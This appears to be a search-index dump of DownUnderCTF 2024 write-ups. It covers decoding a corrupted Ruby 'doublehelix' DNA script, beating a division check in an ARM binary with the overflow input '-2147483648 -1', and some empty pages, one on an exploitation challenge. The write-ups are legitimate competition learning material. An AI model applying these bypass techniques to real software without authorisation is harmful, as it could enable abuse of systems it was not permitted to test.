\"ATATTAGCGCGCTAGCATGCTAGCTAATTAGCCGATCGATATGCATGCGCGCGCGCTAATATGCATGCGCGCCGGCATGCTACGTAGCTAGCTAATATCGATGCTAATTAATTATAGCGCGCTAATGCGCCGCGGCATGCTAGCATATTAATTAV0CGGCATCGATGCTATAATGCCGTACGGCV0GCCGGCCGATGCGCGCCGCGGCATGCTAATTATAV0V0GCATTAATGCGCTAATTATAV0GCTAGCTAATATCGCGGCGCGCCGGCTATAGCGCATATGCGCATATTAATTAGCTAGCGCGCATGCCGATTAGCTATAGCGCATCGATGCTATACGGCGCGCGCGCV0ATTAGCGCGCATGCTATAGCGCTATACGGCCGGCCGGCTATAV0GCATGCATGCGCATATGCTATAGCGCTAATATGCTAATTAATATTAATGCATTAATV0GCTATAGCCGATCGAT\" # same dictinary dict = { \"AT\" : \"00\" , \"CG\" : \"01\" , \"GC\" : \"10\" , \"TA\" : \"11\" , \"V0\" : \"00\" , \"V1\" : \"01\" , \"V2\" : \"10\" , \"V3\" : \"11\" } # reimplemented deconding logic for i in range ( 0 , len ( input ), 8 ): # iterate 8 character at a time # using dictinary convert every 2 characters to binary val = ( dict [ input [ i : i + 2 ]] + dict [ input [ i + 2 : i + 4 ]] + dict [ input [ i + 4 : i + 6 ]] + dict [ input [ i + 6 : i + 8 ]])[:: - 1 ] # print orignal 8 characters, its bynary value and ascii character print ( input [ i : i + 8 ], val , chr ( int ( val , 2 ))) Output is convenient to work with and fix guesses: search for V0, check if character makes sense or try V1/V2/V3. Printable characters in ascii table all starts with 01 so that is a good hint, other bites easy to guess: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 ATATTAGC 01110000 p GCGCTAGC 01110101 u ATGCTAGC 01110100 t TAATTAGC 01110011 s CGATCGAT 00100010 \" ATGCATGC 01000100 D GCGCGCGC 01010101 U TAATATGC 01000011 C ATGCGCGC 01010100 T CGGCATGC 01000110 F TACGTAGC 01111011 { TAGCTAAT 00110111 7 ATCGATGC 01001000 H TAATTAAT 00110011 3 TATAGCGC 01011111 _ GCTAATGC 01001101 M GCCGCGGC 01101001 i ATGCTAGC 01110100 t ATATTAAT 00110000 0 TAV0CGGC 01100011 c ATCGATGC 01001000 H TATAATGC 01001111 O CGTACGGC 01101110 n V0GCCGGC 01100100 d CGATGCGC 01010010 R GCCGCGGC 01101001 i ATGCTAAT 00110100 4 TATAV0V0 00001111 \u000f GCATTAAT 00110001 1 GCGCTAAT 00110101 5 TATAV0GC 01001111 O TAGCTAAT 00110111 7 ATCGCGGC 01101000 h GCGCCGGC 01100101 e TATAGCGC 01011111 _ ATATGCGC 01010000 P ATATTAAT 00110000 0 TAGCTAGC 01110111 w GCGCATGC 01000101 E CGATTAGC 01110010 r TATAGCGC 01011111 _ ATCGATGC 01001000 H TATACGGC 01101111 o GCGCGCGC 01010101 U V0ATTAGC 01110000 p GCGCATGC 01000101 E TATAGCGC 01011111 _ TATACGGC 01101111 o CGGCCGGC 01100110 f TATAV0GC 01001111 O ATGCATGC 01000100 D GCATATGC 01000001 A TATAGCGC 01011111 _ TAATATGC 01000011 C TAATTAAT 00110011 3 ATTAATGC 01001100 L ATTAATV0 00001100 GCTATAGC 01111101 } CGATCGAT 00100010 \" After all fixed, print the flag: solve.py 1 2 3 4 5 6 7 8 9 10 # fixed source code input = \"ATATTAGCGCGCTAGCATGCTAGCTAATTAGCCGATCGATATGCATGCGCGCGCGCTAATATGCATGCGCGCCGGCATGCTACGTAGCTAGCTAATATCGATGCTAATTAATTATAGCGCGCTAATGCGCCGCGGCATGCTAGCATATTAATTAV0CGGCATCGATGCTATAATGCCGTACGGCV0GCCGGCCGATGCGCGCCGCGGCATGCTAATTATAV2V2GCATTAATGCGCTAATTATAV2GCTAGCTAATATCGCGGCGCGCCGGCTATAGCGCATATGCGCATATTAATTAGCTAGCGCGCATGCCGATTAGCTATAGCGCATCGATGCTATACGGCGCGCGCGCV3ATTAGCGCGCATGCTATAGCGCTATACGGCCGGCCGGCTATAV2GCATGCATGCGCATATGCTATAGCGCTAATATGCTAATTAATATTAATGCATTAATV2GCTATAGCCGATCGAT\" dict = { \"AT\" : \"00\" , \"CG\" : \"01\" , \"GC\" : \"10\" , \"TA\" : \"11\" , \"V0\" : \"00\" , \"V1\" : \"01\" , \"V2\" : \"10\" , \"V3\" : \"11\" } for i in range ( 0 , len ( input ), 8 ): # iterate 8 characters at a time # using dictionary convert every 2 characters to binary val = ( dict [ input [ i : i + 2 ]] + dict [ input [ i + 2 : i + 4 ]] + dict [ input [ i + 4 : i + 6 ]] + dict [ input [ i + 6 : i + 8 ]])[:: - 1 ] # print decoded character print ( chr ( int ( val , 2 )), end = \"\" ) Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"DNAdecay"},{"location":"dna/#prologue","text":"Difficulty: easy Category: reverse engineering Solved: 148 Description Our flightless birds can run upto 50km/h but we want them to go faster. I've been messing with a mutigen but it seems to have corrupted. Can you help me recover this research? Input files: dna.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 require \"doublehelix\" AT A -- T T - - A G ---- C G ---- -- C T --- A G -- C AT GC T -- G - - T ---- A A --- T T --- A G --- C C -- G AT CG - T A --- T G --- A -- T G ---- C G C -- C C C T -- A A -- T A -- T G - -- C A ---- T G --- C G -- C GC CG G -- C A --- G ---- C T - -- A C ---- G T --- G -- C A GC T -- A A - T ---- T C ---- G -- - T G --- C T -- A AT A A - T --- A T - - A G ---- C G ---- C G --- C T -- A AT C G - C C -- G C -- - G G ---- C -- - T G - C T -- A G AT -- T T --- ---- T T -- - A ---- C --- G G -- C AT C A - C T ---- A T ---- A A ---- G - C C - G T C G - C -- G ---- C - -- G G - - C -- G A -- T G GC G -- C C --- G C -- - G G --- C A --- G - - C T -- A A TA T -- A -- ---- G -- - C A - -- T T - - A -- T GC GC T - A A --- T T -- - A T ---- A ---- G -- C T -- A GC A A - A -- T C ---- G C ---- G ---- C G --- C G - C CG GC T -- A T --- G ---- C G -- - C A --- A -- G -- GC AT A -- T T --- A -- T T ---- A G --- T -- A G -- C C GC A - T G --- C C --- G --- T - - A G --- C -- A A G G -- C A -- T C - -- G A --- T ---- C T - T - CG C G - C G --- C G - C G --- --- --- T - A G C G - A -- T G ---- C T --- A T --- A G -- C G - TA A C -- G G --- C ---- G ---- C C ---- G G --- C T - A TA G -- C A --- T -- - C ---- T G ---- G --- A -- T AT GC - A T --- G - -- C G --- C T - -- A A -- T A -- T C TA A - T T - - A ---- T A ---- T T ---- A A -- T G -- C A TA A - T --- G - -- C T ---- A T --- A - - C C -- T CG A - T NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"dna/#my-struggle","text":"Disclaimer : this is the first time I've opened ruby script, therefore technique is primitive and far from optimal. At this point I can't tell if file we were given is a valid ruby script or first we have to decode the DNA it somehow before running. There is only one searchable string to start with: require \"doublehelix\" (I don't believe googling all those AT TA can be helpful). Quickly landed at following library on github https://github.com/mame/doublehelix . Entire encoding and decoding is implemented in less than 20 lines : source code of doublehelix.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" } eval ( [ $code . gsub ( /../ ) { | s | dict [ s ] } ]. pack ( \"b*\" )) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end I wasn't able to install the package in my machine and run hello world (probably my environment is not properly set up). But, replacing require \"doublehelix\" with contents of the library did the trick. After that I've tried to run source code that we were given in the challenge. Of cause, it was not so easy: task description mentions but it seems to have corrupted. Can you help me recover this research? So we have to fix the script first. At lines 7 and 12 of the source code we can see that there are only 4 possible pairs of gens (AT, CG, GC, TA). As a first path I went through the script and repaired all lines that included 1 letter: lines with A should have T lines with T should have A liens with C should have G lines with G should have C Its easy to pick a sequence to use (for example AT or TA) visually (fit DNA picture). Now lets work on empty lines. We will have to guess what it is. For that I've added few modifications: modied dna.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do # extended dictianary with 4 new gens: V0, V1, V2, V3 that produce same bits as existing ones # now I can enter my guesses and still able to distinct given input from my guesses dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" , \"V0\" => \"00\" , \"V1\" => \"01\" , \"V2\" => \"10\" , \"V3\" => \"11\" } # print concatenated source code for debug purposes puts $code res = [ $code . gsub ( /../ ) { | s | dict [ s ] } ] # print decoded bits for debug purposes puts res puts res . pack ( \"b*\" ) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end # removed all spaces and punctuation symbols as it was giving errors and not used in decoding anyway AT AT TA GC GC ... GC AT AT TA AT TA # I've replaced all empty lines with V0 as a starting point V0 CG GC AT CG ... Now lets run it: 1 2 3 4 $ ruby dna_modified.rb ATATTAGCGCGCTAGCATGCTAGCTAATTAGCCGATCGATATGCATGCGCGCGCGCTAATATGCATGCGCGCCGGCATGCTACGTAGCTAGCTAATATCGATGCTAATTAATTATAGCGCGCTAATGCGCCGCGGCATGCTAGCATATTAATTAV0CGGCATCGATGCTATAATGCCGTACGGCV0GCCGGCCGATGCGCGCCGCGGCATGCTAATTATAV0V0GCATTAATGCGCTAATTATAV0GCTAGCTAATATCGCGGCGCGCCGGCTATAGCGCATATGCGCATATTAATTAGCTAGCGCGCATGCCGATTAGCTATAGCGCATCGATGCTATACGGCGCGCGCGCV0ATTAGCGCGCATGCTATAGCGCTATACGGCCGGCCGGCTATAV0GCATGCATGCGCATATGCTATAGCGCTAATATGCTAATTAATATTAATGCATTAATV0GCTATAGCCGATCGAT 0000111010101110001011101100111001000100001000101010101011000010001010100110001011011110111011000001001011001100111110101011001010010110001011100000110011010110000100101111001001110110011001100100101010010110001011001111010110001100101011001111011011101100000101101010011011111010000010100000110011101110101000100100111011111010000100101111011010101010010011101010001011111010111101100110011011110110001000101000001011111010110000101100110000110010001100011011111001000100 puts \"DUCTF{7H3_Mit0kHOnfRi4\ufffd15o7he_P0wEr_HoUrE_ofoDA_C3L\ufffd}\" Looking good, we can even read most of the flag (except for few characters where guess is wrong). We can continue this in python now: 1 2 3 4 5 6 7 8 9 10 11 12 # source code sequence we recieve from ruby input = \"ATATTAGCGCGCTAGCATGCTAGCTAATTAGCCGATCGATATGCATGCGCGCGCGCTAATATGCATGCGCGCCGGCATGCTACGTAGCTAGCTAATATCGATGCTAATTAATTATAGCGCGCTAATGCGCCGCGGCATGCTAGCATATTAATTAV0CGGCATCGATGCTATAATGCCGTACGGCV0GCCGGCCGATGCGCGCCGCGGCATGCTAATTATAV0V0GCATTAATGCGCTAATTATAV0GCTAGCTAATATCGCGGCGCGCCGGCTATAGCGCATATGCGCATATTAATTAGCTAGCGCGCATGCCGATTAGCTATAGCGCATCGATGCTATACGGCGCGCGCGCV0ATTAGCGCGCATGCTATAGCGCTATACGGCCGGCCGGCTATAV0GCATGCATGCGCATATGCTATAGCGCTAATATGCTAATTAATATTAATGCATTAATV0GCTATAGCCGATCGAT\" # same dictinary dict = { \"AT\" : \"00\" , \"CG\" : \"01\" , \"GC\" : \"10\" , \"TA\" : \"11\" , \"V0\" : \"00\" , \"V1\" : \"01\" , \"V2\" : \"10\" , \"V3\" : \"11\" } # reimplemented deconding logic for i in range ( 0 , len ( input ), 8 ): # iterate 8 character at a time # using dictinary convert every 2 characters to binary val = ( dict [ input [ i : i + 2 ]] + dict [ input [ i + 2 : i + 4 ]] + dict [ input [ i + 4 : i + 6 ]] + dict [ input [ i + 6 : i + 8 ]])[:: - 1 ] # print orignal 8 characters, its bynary value and ascii character print ( input [ i : i + 8 ], val , chr ( int ( val , 2 ))) Output is convenient to work with and fix guesses: search for V0, check if character makes sense or try V1/V2/V3. Printable characters in ascii table all starts with 01 so that is a good hint, other bites easy to guess: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 ATATTAGC 01110000 p GCGCTAGC 01110101 u ATGCTAGC 01110100 t TAATTAGC 01110011 s CGATCGAT 00100010 \" ATGCATGC 01000100 D GCGCGCGC 01010101 U TAATATGC 01000011 C ATGCGCGC 01010100 T CGGCATGC 01000110 F TACGTAGC 01111011 { TAGCTAAT 00110111 7 ATCGATGC 01001000 H TAATTAAT 00110011 3 TATAGCGC 01011111 _ GCTAATGC 01001101 M GCCGCGGC 01101001 i ATGCTAGC 01110100 t ATATTAAT 00110000 0 TAV0CGGC 01100011 c ATCGATGC 01001000 H TATAATGC 01001111 O CGTACGGC 01101110 n V0GCCGGC 01100100 d CGATGCGC 01010010 R GCCGCGGC 01101001 i ATGCTAAT 00110100 4 TATAV0V0 00001111 \u000f GCATTAAT 00110001 1 GCGCTAAT 00110101 5 TATAV0GC 01001111 O TAGCTAAT 00110111 7 ATCGCGGC 01101000 h GCGCCGGC 01100101 e TATAGCGC 01011111 _ ATATGCGC 01010000 P ATATTAAT 00110000 0 TAGCTAGC 01110111 w GCGCATGC 01000101 E CGATTAGC 01110010 r TATAGCGC 01011111 _ ATCGATGC 01001000 H TATACGGC 01101111 o GCGCGCGC 01010101 U V0ATTAGC 01110000 p GCGCATGC 01000101 E TATAGCGC 01011111 _ TATACGGC 01101111 o CGGCCGGC 01100110 f TATAV0GC 01001111 O ATGCATGC 01000100 D GCATATGC 01000001 A TATAGCGC 01011111 _ TAATATGC 01000011 C TAATTAAT 00110011 3 ATTAATGC 01001100 L ATTAATV0 00001100 GCTATAGC 01111101 } CGATCGAT 00100010 \" After all fixed, print the flag: solve.py 1 2 3 4 5 6 7 8 9 10 # fixed source code input = \"ATATTAGCGCGCTAGCATGCTAGCTAATTAGCCGATCGATATGCATGCGCGCGCGCTAATATGCATGCGCGCCGGCATGCTACGTAGCTAGCTAATATCGATGCTAATTAATTATAGCGCGCTAATGCGCCGCGGCATGCTAGCATATTAATTAV0CGGCATCGATGCTATAATGCCGTACGGCV0GCCGGCCGATGCGCGCCGCGGCATGCTAATTATAV2V2GCATTAATGCGCTAATTATAV2GCTAGCTAATATCGCGGCGCGCCGGCTATAGCGCATATGCGCATATTAATTAGCTAGCGCGCATGCCGATTAGCTATAGCGCATCGATGCTATACGGCGCGCGCGCV3ATTAGCGCGCATGCTATAGCGCTATACGGCCGGCCGGCTATAV2GCATGCATGCGCATATGCTATAGCGCTAATATGCTAATTAATATTAATGCATTAATV2GCTATAGCCGATCGAT\" dict = { \"AT\" : \"00\" , \"CG\" : \"01\" , \"GC\" : \"10\" , \"TA\" : \"11\" , \"V0\" : \"00\" , \"V1\" : \"01\" , \"V2\" : \"10\" , \"V3\" : \"11\" } for i in range ( 0 , len ( input ), 8 ): # iterate 8 characters at a time # using dictionary convert every 2 characters to binary val = ( dict [ input [ i : i + 2 ]] + dict [ input [ i + 2 : i + 4 ]] + dict [ input [ i + 4 : i + 6 ]] + dict [ input [ i + 6 : i + 8 ]])[:: - 1 ] # print decoded character print ( chr ( int ( val , 2 )), end = \"\" )","title":"My struggle"},{"location":"dna/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"jmp_flag/","text":"Prologue \u00b6 Difficulty: easy Category: reverse engineering Solved: 71 Description The flag is just a hop, a skip and a jump away. Input files: encoding.txt NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Jmp flag writeup"},{"location":"jmp_flag/#prologue","text":"Difficulty: easy Category: reverse engineering Solved: 71 Description The flag is just a hop, a skip and a jump away. Input files: encoding.txt NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"jmp_flag/#my-struggle","text":"","title":"My struggle"},{"location":"jmp_flag/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"number_mashing/","text":"My second writeup for Down Under CTF 2024. Feedback is much appreciated. Prologue \u00b6 Difficulty: beginner Category: reverse engineering Solved: 299 Description Mash your keyboard numpad in a specific order and a flag might just pop out! Input files: number_mashing NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Check what type of file we got: 1 2 3 4 5 6 7 8 9 10 $ file number-mashing number-mashing: ELF 64 -bit LSB pie executable, # 64bit ARM aarch64, # ARM machine need to run version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID [ sha1 ]= ab93f9bc0ec8c3d321da1b7e954e739e13ee8ab1, for GNU/Linux 3 .7.0, not stripped # likely a readable code can be extracted I didn't have arm environment ready at that moment, so won't be able to run the binary locally. Instead, lets fire up ghidra and try to understand the code, as mentioned above it should make a lot of sense given binary is not stripped. original ghydra output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 undefined8 main ( void ) { local_8 = ___stack_chk_guard ; setvbuf ( _stdout ,( char * ) 0x0 , 2 , 0 ); setvbuf ( _stdin ,( char * ) 0x0 , 2 , 0 ); printf ( \"Give me some numbers: \" ); __isoc99_scanf ( \"%d %d\" , & local_11c , & local_118 ); if ((( local_11c == 0 ) || ( local_118 == 0 )) || ( local_118 == 1 )) { puts ( \"Nope!\" ); /* WARNING: Subroutine does not return */ exit ( 1 ); } local_114 = 0 ; if ( local_118 != 0 ) { local_114 = local_11c / local_118 ; } if ( local_114 != local_11c ) { puts ( \"Nope!\" ); /* WARNING: Subroutine does not return */ exit ( 1 ); } local_110 = fopen ( \"flag.txt\" , \"r\" ); fread ( & local_108 , 1 , 0x100 , local_110 ); printf ( \"Correct! %s \\n \" , & local_108 ); if ( local_8 - ___stack_chk_guard != 0 ) { /* WARNING: Subroutine does not return */ __stack_chk_fail ( & __stack_chk_guard , 0 , 0 , local_8 - ___stack_chk_guard ); } return 0 ; } We can see print, scanf, then some calculations. Cleaned version with extra comments: cleaned source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <stdio.h> void main () { int first , second ; printf ( \"Give me some numbers: \" ); scanf ( \"%d %d\" , & first , & second ); # read two numbers : first and second # check that first is not 0 and second is no 0 nor 1 if ((( first == 0 ) || ( second == 0 )) || ( second == 1 )) { puts ( \"Nope!\" ); exit ( 1 ); } int res = first / second ; # divide if ( res != first ) { # check that result is equal to first number puts ( \"Nope!\" ); exit ( 1 ); } puts ( \"Here is your flag flag!\" ); } Now the task is clear: we are looking for two numbers such that when one is divided by the other the result is equal to dividend. Usually we would achieve it with by having second number as one 4 / 1 = 4 , but extra condition in the code that we should use 1. Quick check with my times table confirmed that calculus won't help us here. Instead, we want to take advantage of overflow. Goal is to find such numbers that result won't fit into the register and when truncated will be equal to dividend. Its quite easy to do with multiplication, for example for 1 byte numbers: 0x10 * 0x11 = 0x110 , which is truncated to 0x10 . To experiment locally I've compiled the code above gcc -o number-mashing number-mashing.c . After a bit trial and error within constraints that second cannot be large number, in fact only -1 makes sense (and maybe 2 if we treat divide by two as shift right where flag bit is carried). And first number should have top bits sets, so they will be truncated by flag bit. Testing with following inputs -2147483648 -1 gives us something interesting: 1 2 3 $ ./number-mashing Give me some numbers: -2147483648 -1 zsh: floating point exception ./number-mashing On x86 architecture idiv assembly instruction is used, quick google idiv floating point exception bring us to stackoverflow . idiv will raise an exception in two cases: You divide by zero The division result is not in the range that can be represented by the eax register Indeed, range for 4 byte number is from -2147483648 to 2147483647, so result of -2147483648 / -1 = 2147483648 doesn't fit in the range above, hence we got error. On arm architecture sdiv instruction is used, it doesn't raise exception, instead carry flag is set in cpsr register. Connecting to the challenge server and submitting two numbers got us the flag. Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Number mashing"},{"location":"number_mashing/#prologue","text":"Difficulty: beginner Category: reverse engineering Solved: 299 Description Mash your keyboard numpad in a specific order and a flag might just pop out! Input files: number_mashing NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"number_mashing/#my-struggle","text":"Check what type of file we got: 1 2 3 4 5 6 7 8 9 10 $ file number-mashing number-mashing: ELF 64 -bit LSB pie executable, # 64bit ARM aarch64, # ARM machine need to run version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID [ sha1 ]= ab93f9bc0ec8c3d321da1b7e954e739e13ee8ab1, for GNU/Linux 3 .7.0, not stripped # likely a readable code can be extracted I didn't have arm environment ready at that moment, so won't be able to run the binary locally. Instead, lets fire up ghidra and try to understand the code, as mentioned above it should make a lot of sense given binary is not stripped. original ghydra output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 undefined8 main ( void ) { local_8 = ___stack_chk_guard ; setvbuf ( _stdout ,( char * ) 0x0 , 2 , 0 ); setvbuf ( _stdin ,( char * ) 0x0 , 2 , 0 ); printf ( \"Give me some numbers: \" ); __isoc99_scanf ( \"%d %d\" , & local_11c , & local_118 ); if ((( local_11c == 0 ) || ( local_118 == 0 )) || ( local_118 == 1 )) { puts ( \"Nope!\" ); /* WARNING: Subroutine does not return */ exit ( 1 ); } local_114 = 0 ; if ( local_118 != 0 ) { local_114 = local_11c / local_118 ; } if ( local_114 != local_11c ) { puts ( \"Nope!\" ); /* WARNING: Subroutine does not return */ exit ( 1 ); } local_110 = fopen ( \"flag.txt\" , \"r\" ); fread ( & local_108 , 1 , 0x100 , local_110 ); printf ( \"Correct! %s \\n \" , & local_108 ); if ( local_8 - ___stack_chk_guard != 0 ) { /* WARNING: Subroutine does not return */ __stack_chk_fail ( & __stack_chk_guard , 0 , 0 , local_8 - ___stack_chk_guard ); } return 0 ; } We can see print, scanf, then some calculations. Cleaned version with extra comments: cleaned source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <stdio.h> void main () { int first , second ; printf ( \"Give me some numbers: \" ); scanf ( \"%d %d\" , & first , & second ); # read two numbers : first and second # check that first is not 0 and second is no 0 nor 1 if ((( first == 0 ) || ( second == 0 )) || ( second == 1 )) { puts ( \"Nope!\" ); exit ( 1 ); } int res = first / second ; # divide if ( res != first ) { # check that result is equal to first number puts ( \"Nope!\" ); exit ( 1 ); } puts ( \"Here is your flag flag!\" ); } Now the task is clear: we are looking for two numbers such that when one is divided by the other the result is equal to dividend. Usually we would achieve it with by having second number as one 4 / 1 = 4 , but extra condition in the code that we should use 1. Quick check with my times table confirmed that calculus won't help us here. Instead, we want to take advantage of overflow. Goal is to find such numbers that result won't fit into the register and when truncated will be equal to dividend. Its quite easy to do with multiplication, for example for 1 byte numbers: 0x10 * 0x11 = 0x110 , which is truncated to 0x10 . To experiment locally I've compiled the code above gcc -o number-mashing number-mashing.c . After a bit trial and error within constraints that second cannot be large number, in fact only -1 makes sense (and maybe 2 if we treat divide by two as shift right where flag bit is carried). And first number should have top bits sets, so they will be truncated by flag bit. Testing with following inputs -2147483648 -1 gives us something interesting: 1 2 3 $ ./number-mashing Give me some numbers: -2147483648 -1 zsh: floating point exception ./number-mashing On x86 architecture idiv assembly instruction is used, quick google idiv floating point exception bring us to stackoverflow . idiv will raise an exception in two cases: You divide by zero The division result is not in the range that can be represented by the eax register Indeed, range for 4 byte number is from -2147483648 to 2147483647, so result of -2147483648 / -1 = 2147483648 doesn't fit in the range above, hence we got error. On arm architecture sdiv instruction is used, it doesn't raise exception, instead carry flag is set in cpsr register. Connecting to the challenge server and submitting two numbers got us the flag.","title":"My struggle"},{"location":"number_mashing/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"pac_shell/","text":"Prologue \u00b6 Difficulty: easy Category: binary exploitation Solved: 55 Description Welcome to pac shell v0.0.1. You have arbitrary read and write, please turn this into arbitrary code execution! Input files: encoding.txt NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Pac shell writeup"},{"location":"pac_shell/#prologue","text":"Difficulty: easy Category: binary exploitation Solved: 55 Description Welcome to pac shell v0.0.1. You have arbitrary read and write, please turn this into arbitrary code execution! Input files: encoding.txt NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"pac_shell/#my-struggle","text":"","title":"My struggle"},{"location":"pac_shell/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: 